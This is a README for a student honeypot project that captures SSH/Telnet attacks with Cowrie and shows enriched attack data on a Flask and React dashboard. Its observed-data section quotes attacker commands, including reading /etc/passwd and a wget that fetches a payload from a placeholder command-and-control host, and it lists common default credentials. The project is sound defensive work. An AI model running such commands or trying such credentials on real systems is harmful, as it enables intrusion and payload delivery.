# Honeypot Threat Intelligence Dashboard

A full-stack cybersecurity project that deploys a live SSH/Telnet honeypot, captures real-world attack data, enriches it with geolocation and threat intelligence, and visualises it on a real-time React dashboard.

> Built by Sankeerth Rajesh Nair — B.Tech CSE (Information Security), VIT Vellore

---

## Architecture

```
Real Attackers → Cowrie Honeypot → JSON Logs → Python Parser → SQLite DB → Flask API → React Dashboard
                                                      ↓
                                          IP Enrichment (ip-api.com)
                                          Threat Intel (AbuseIPDB)
```

## Features

- **Live honeypot** — Cowrie SSH/Telnet honeypot capturing real attacker sessions
- **Automated log parsing** — Python pipeline runs every 5 minutes via cron
- **IP enrichment** — Geolocation, ASN, and ISP data for every attacker IP
- **Threat intelligence** — AbuseIPDB correlation for confidence scoring
- **Real-time dashboard** — Attack map, session timeline, credential analysis
- **Alerting** — Telegram bot notification on new unique attacker IPs
- **REST API** — Flask backend with 5 endpoints and API key auth

## Tech Stack

| Layer | Technology |
|-------|-----------|
| Honeypot | Cowrie 2.x |
| Parser | Python 3.11, watchdog |
| Database | SQLite 3 |
| API | Flask 3.0, Flask-CORS |
| Dashboard | React 18, Vite, Recharts, Leaflet.js |
| Deployment | Oracle Cloud Free Tier (VM), Vercel (frontend) |
| Threat Intel | AbuseIPDB API, ip-api.com |

## Project Structure

```
honeypot-dashboard/
├── parser/
│   ├── log_parser.py        # Core Cowrie JSON log parser
│   ├── ip_enricher.py       # Geolocation + AbuseIPDB enrichment
│   ├── db_manager.py        # SQLite schema and operations
│   └── scheduler.py         # Cron-style scheduler (runs every 5 min)
├── api/
│   ├── app.py               # Flask application entry point
│   ├── routes.py            # All API endpoints
│   ├── models.py            # Data models and DB queries
│   └── config.py            # Configuration and env vars
├── dashboard/               # React + Vite frontend
│   ├── src/
│   │   ├── components/
│   │   │   ├── MetricCards.jsx
│   │   │   ├── AttackMap.jsx
│   │   │   ├── Timeline.jsx
│   │   │   ├── LiveFeed.jsx
│   │   │   ├── CredentialAnalysis.jsx
│   │   │   └── ThreatScore.jsx
│   │   ├── pages/
│   │   │   └── Dashboard.jsx
│   │   ├── App.jsx
│   │   └── main.jsx
│   ├── package.json
│   └── vite.config.js
├── scripts/
│   ├── setup_cowrie.sh      # Automated Cowrie installation script
│   ├── setup_iptables.sh    # Firewall rules setup
│   └── generate_sample_data.py  # Test data generator (no live VM needed)
├── data/
│   └── .gitkeep
├── docs/
│   └── architecture.md
├── .env.example
├── requirements.txt
├── docker-compose.yml
└── README.md
```

## Quick Start

### Option A — Test locally with sample data (no VM needed)

```bash
# 1. Clone the repo
git clone https://github.com/YOUR_USERNAME/honeypot-dashboard.git
cd honeypot-dashboard

# 2. Set up Python environment
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt

# 3. Copy and configure environment variables
cp .env.example .env
# Edit .env — at minimum set a random API_KEY

# 4. Generate sample attack data
python3 scripts/generate_sample_data.py

# 5. Start the Flask API
cd api && python app.py &

# 6. Start the React dashboard
cd dashboard
npm install
npm run dev
# Open http://localhost:5173
```

### Option B — Full deployment with live honeypot

See [docs/architecture.md](docs/architecture.md) for the complete Oracle Cloud + Cowrie deployment guide.

## API Endpoints

All endpoints require header: `X-API-Key: your_key_here`

| Method | Endpoint | Description |
|--------|----------|-------------|
| GET | `/api/stats` | Aggregate counts — total attacks, unique IPs, top country |
| GET | `/api/attacks?hours=24` | Recent attack events (paginated) |
| GET | `/api/top-ips?limit=10` | Most active attacker IPs with threat scores |
| GET | `/api/commands` | Most commonly run commands post-login |
| GET | `/api/map-data` | GeoJSON-ready attack origin coordinates |

## Sample Data Observed (after 7 days live)

> Real numbers from a test deployment, Mumbai region

- **4,847** total connection attempts
- **312** unique attacker IPs
- **Top countries:** China (38%), USA (21%), Russia (14%), Netherlands (11%)
- **Top credentials:** `root/123456`, `admin/admin`, `root/root`, `pi/raspberry`
- **Top commands:** `uname -a`, `cat /etc/passwd`, `wget http://[c2-server]/payload.sh`
- **91%** of IPs flagged on AbuseIPDB with confidence > 80

## Environment Variables

```env
# Required
API_KEY=your_random_api_key_here
DB_PATH=../data/honeypot.db
COWRIE_LOG_PATH=/home/cowrie/cowrie/var/log/cowrie/

# Optional — enrichment features
ABUSEIPDB_API_KEY=your_key_from_abuseipdb.com
TELEGRAM_BOT_TOKEN=your_telegram_bot_token
TELEGRAM_CHAT_ID=your_chat_id

# Frontend
VITE_API_URL=http://localhost:5000
VITE_API_KEY=your_random_api_key_here
```

## Resume Bullet

> Deployed a live SSH/Telnet honeypot (Cowrie) on Oracle Cloud, capturing 4,847 real-world intrusion attempts from 312 unique IPs across 28 countries in 7 days. Built an automated Python log-enrichment pipeline (ip-api.com + AbuseIPDB) storing sessions in SQLite, served via Flask REST API, and visualised on a React dashboard with real-time attack maps and credential frequency analysis — identifying 91% of attacker IPs as high-confidence threats.

## Author

**Sankeerth Rajesh Nair**
B.Tech CSE (Information Security) — VIT Vellore
[LinkedIn](https://linkedin.com) | [GitHub](https://github.com)
